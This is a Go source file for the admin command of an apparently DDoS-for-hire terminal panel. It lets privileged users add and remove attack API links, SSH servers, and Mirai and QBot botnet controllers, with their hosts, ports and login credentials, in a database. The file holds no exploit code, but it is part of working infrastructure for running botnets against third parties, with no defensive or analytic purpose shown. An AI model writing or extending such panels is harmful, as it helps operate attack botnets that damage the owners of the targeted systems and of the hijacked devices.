package commands

import (
	"fmt"
	"log"
	"strconv"
	"webserver/src/database"
	"webserver/src/server/sessions"
)

func api(session *sessions.Session, args []string) {
	conn := session.Conn
	if session.User.Rank != 2 {
		fmt.Fprintf(conn, "Insufficient Permissions...\r\n")
		return
	} else {
		if len(args) < 2 {
			fmt.Fprintf(conn, "\nInvalid Options Run: %s <help / ?>\r\n", args[0])
			return
		} else {
			switch args[1] {
			case "apiadd", "APIADD":
				fmt.Fprintf(conn, "Link: ")
				link, err := session.Term.ReadLine("Link: ")
				if err != nil {
					return
				}
				fmt.Fprintf(conn, "Tag: ")
				tag, err := session.Term.ReadLine("Tag: ")
				if err != nil {
					return
				}
				fmt.Fprintf(conn, "Active(y/n): ")
				active, err := session.Term.ReadLine("Active(y/n): ")
				if err != nil {
					return
				}

				var act int
				switch active {
				case "yes", "y", "Y":
					act = 1
					break
				case "no", "n", "N":
					act = 0
					break
				}
				if err := database.AddNewAPI(link, tag, act); err != nil {
					fmt.Fprintf(conn, "Could Not Add API...")
					log.Printf("(db/err) %s", err)
					return
				} else {
					fmt.Fprintf(conn, "Successfully Inserted API\r\n")
				}
				break
			case "apiremove", "APIREMOVE":
				fmt.Fprintf(conn, "Tag: ")
				tag, err := session.Term.ReadLine("Tag: ")
				if err != nil {
					return
				}
				if err := database.RemoveAPI(tag); err != nil {
					fmt.Fprintf(conn, "Could Not Remove API...")
					log.Printf("(err/api_remove) %s", err)
					return
				} else {
					fmt.Fprintf(conn, "Removed API Successfully...\r\n")
				}
				break
			case "sshadd", "SSHADD":
				fmt.Fprintf(conn, "Host: ")
				host, err := session.Term.ReadLine("Host: ")
				if err != nil {
					return
				}
				fmt.Fprintf(conn, "Port: ")
				prt, err := session.Term.ReadLine("Port: ")
				if err != nil {
					return
				}
				port, err := strconv.Atoi(prt)
				if err != nil {
					fmt.Fprintf(conn, "Invalid Interger\r\n")
					return
				}
				fmt.Fprintf(conn, "Username: ")
				username, err := session.Term.ReadLine("Username: ")
				if err != nil {
					return
				}
				fmt.Fprintf(conn, "Password: ")
				password, err := session.Term.ReadLine("Password: ")
				if err != nil {
					return
				}
				fmt.Fprintf(conn, "Tag: ")
				tag, err := session.Term.ReadLine("Tag: ")
				if err != nil {
					return
				}

				if err := database.AddSSH(host, port, username, password, tag); err != nil {
					fmt.Fprintf(conn, "Something Went Wrong...\r\n")
					log.Printf("(err) %s", err)
					return
				} else {
					fmt.Fprintf(conn, "Successfully Added...\r\n")
				}
				break
			case "miraiadd", "MIRAIADD":

				fmt.Fprintf(conn, "Host: ")
				host, err := session.Term.ReadLine("Host: ")
				if err != nil {
					return
				}
				fmt.Fprintf(conn, "Port: ")
				prt, err := session.Term.ReadLine("Port: ")
				if err != nil {
					return
				}
				port, err := strconv.Atoi(prt)
				if err != nil {
					fmt.Fprintf(conn, "Invalid Interger\r\n")
					return
				}
				fmt.Fprintf(conn, "Username: ")
				username, err := session.Term.ReadLine("Username: ")
				if err != nil {
					return
				}
				fmt.Fprintf(conn, "Password: ")
				password, err := session.Term.ReadLine("Password: ")
				if err != nil {
					return
				}
				fmt.Fprintf(conn, "Tag: ")
				tag, err := session.Term.ReadLine("Tag: ")
				if err != nil {
					return
				}

				if err := database.AddMirai(host, port, username, password, tag); err != nil {
					fmt.Fprintf(conn, "Something Went Wrong...\r\n")
					log.Printf("(err) %s", err)
					return
				} else {
					fmt.Fprintf(conn, "Successfully Added...\r\n")
				}
				break
			case "qbotadd", "QBOTADD":

				fmt.Fprintf(conn, "Host: ")
				host, err := session.Term.ReadLine("Host: ")
				if err != nil {
					return
				}
				fmt.Fprintf(conn, "Port: ")
				prt, err := session.Term.ReadLine("Port: ")
				if err != nil {
					return
				}
				port, err := strconv.Atoi(prt)
				if err != nil {
					fmt.Fprintf(conn, "Invalid Interger\r\n")
					return
				}
				fmt.Fprintf(conn, "Username: ")
				username, err := session.Term.ReadLine("Username: ")
				if err != nil {
					return
				}
				fmt.Fprintf(conn, "Password: ")
				password, err := session.Term.ReadLine("Password: ")
				if err != nil {
					return
				}
				fmt.Fprintf(conn, "Tag: ")
				tag, err := session.Term.ReadLine("Tag: ")
				if err != nil {
					return
				}

				if err := database.AddQBOT(host, port, username, password, tag); err != nil {
					fmt.Fprintf(conn, "Something Went Wrong...\r\n")
					log.Printf("(err) %s", err)
					return
				} else {
					fmt.Fprintf(conn, "Successfully Added...\r\n")
				}
				break
			case "removeqbot", "REMOVEQBOT":
				fmt.Fprintf(conn, "Tag: ")
				tag, err := session.Term.ReadLine("Tag: ")
				if err != nil {
					return
				}
				if err := database.RemoveQbot(tag); err != nil {
					fmt.Fprintf(conn, "Something Went Wrong...\r\n")
					log.Printf("(err) %s", err)
					return
				} else {
					fmt.Fprintf(conn, "Successfully Removed...\r\n")
				}
				break
			case "sshremove", "SSHREMOVE":
				fmt.Fprintf(conn, "Tag: ")
				tag, err := session.Term.ReadLine("Tag: ")
				if err != nil {
					return
				}
				if err := database.RemoveSSH(tag); err != nil {
					fmt.Fprintf(conn, "Something Went Wrong...\r\n")
					log.Printf("(err) %s", err)
					return
				} else {
					fmt.Fprintf(conn, "Successfully Removed...\r\n")
				}
				break
			case "mirairemove", "MIRAIREMOVE":
				fmt.Fprintf(conn, "Tag: ")
				tag, err := session.Term.ReadLine("Tag: ")
				if err != nil {
					return
				}
				if err := database.RemoveMirai(tag); err != nil {
					fmt.Fprintf(conn, "Something Went Wrong...\r\n")
					log.Printf("(err) %s", err)
					return
				} else {
					fmt.Fprintf(conn, "Successfully Removed...\r\n")
				}
			case "help", "HELP", "?":
				fmt.Fprintf(conn, "[+]===============[+]\r\n")
				fmt.Fprintf(conn, "-- apiadd\r\n")
				fmt.Fprintf(conn, "-- miraiadd\r\n")
				fmt.Fprintf(conn, "-- qbotadd\r\n")
				fmt.Fprintf(conn, "-- sshadd\r\n")
				fmt.Fprintf(conn, "-- sshremove\r\n")
				fmt.Fprintf(conn, "-- removeqbot\r\n")
				fmt.Fprintf(conn, "-- mirairemove\r\n")
				fmt.Fprintf(conn, "-- apiremove\r\n")
				fmt.Fprintf(conn, "[+]===============[+]\r\n")
			}
		}
	}
}
